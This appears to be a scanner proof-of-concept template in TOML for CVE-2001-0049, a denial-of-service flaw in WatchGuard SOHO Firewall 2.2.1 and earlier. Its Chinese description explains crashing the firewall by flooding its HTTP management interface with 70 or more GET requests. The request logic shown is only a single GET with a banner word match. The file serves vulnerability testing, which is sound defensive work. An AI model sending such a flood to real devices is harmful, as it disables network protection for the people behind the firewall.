[info]
author = "ave"
description = "向 WatchGuard SOHO Firewall 2.2.1 及更早版本的 HTTP 管理接口发送大量 GET 请求（70次以上），耗尽设备内存资源导致防火墙重启或完全关闭，验证拒绝服务漏洞。"
id = "POC-AVE-2001-0023"
name = "WatchGuard SOHO Firewall 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["cve-2001-0049"]
vuln_id = [
    "CVE-2001-0049",
    "AVE-2001-0023",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "HTTP",
    "WatchGuard",
    "SOHO",
]
